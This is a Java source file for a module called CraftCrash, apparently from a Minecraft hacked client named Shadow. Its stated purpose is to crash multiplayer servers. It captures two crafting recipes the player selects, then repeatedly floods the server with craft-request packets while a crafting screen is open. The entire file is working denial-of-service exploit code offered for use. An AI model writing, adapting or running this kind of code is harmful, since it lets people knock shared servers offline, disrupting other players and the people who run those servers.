/*
 * Copyright (c) Shadow client, 0x150, Saturn5VFive 2022. All rights reserved.
 */

package net.shadow.client.feature.module.impl.crash;

import net.minecraft.client.gui.screen.ingame.CraftingScreen;
import net.minecraft.client.util.math.MatrixStack;
import net.minecraft.network.packet.c2s.play.CraftRequestC2SPacket;
import net.minecraft.recipe.Recipe;
import net.shadow.client.feature.gui.notifications.Notification;
import net.shadow.client.feature.module.Module;
import net.shadow.client.feature.module.ModuleType;
import net.shadow.client.helper.event.EventListener;
import net.shadow.client.helper.event.EventType;
import net.shadow.client.helper.event.Events;
import net.shadow.client.helper.event.events.PacketEvent;

public class CraftCrash extends Module {

    int ticks;
    boolean isListening = false;
    Recipe stick = null;
    Recipe buton = null;
    int superticks;


    public CraftCrash() {
        super("CraftCrash", "Crash the server with rapid crafting", ModuleType.CRASH);
        Events.registerEventHandlerClass(this);
    }

    @EventListener(type = EventType.PACKET_SEND)
    public void onPacketSend(PacketEvent event) {
        if (!this.isEnabled()) return;
        if (event.getPacket() instanceof CraftRequestC2SPacket packet) {
            if (isListening) {
                if (stick == null) {
                    stick = client.player.world.getRecipeManager().get(packet.getRecipe()).get();
                    Notification.create(1000, "CraftCrash", Notification.Type.INFO, "Selected first recipe");
                } else {
                    buton = client.player.world.getRecipeManager().get(packet.getRecipe()).get();
                    Notification.create(1000, "CraftCrash", Notification.Type.INFO, "Selected second recipe");
                    Notification.create(1000, "CraftCrash", Notification.Type.SUCCESS, "Starting the crash!");
                    isListening = false;
                }
            }
        }
    }

    @Override
    public void tick() {
        if (client.currentScreen instanceof CraftingScreen && !isListening) {
            int sync = client.player.currentScreenHandler.syncId;
            superticks++;
            if (superticks % 15 == 0) {
                for (int i = 0; i < 3; i++) {
                    client.player.networkHandler.sendPacket(new CraftRequestC2SPacket(sync, stick, true));
                    client.player.networkHandler.sendPacket(new CraftRequestC2SPacket(sync, buton, true));
                }
            }
        }
    }

    @Override
    public void enable() {
    }

    @Override
    public void disable() {
    }

    @Override
    public String getContext() {
        return null;
    }

    @Override
    public void onWorldRender(MatrixStack matrices) {

    }

    @Override
    public void onHudRender() {

    }
}
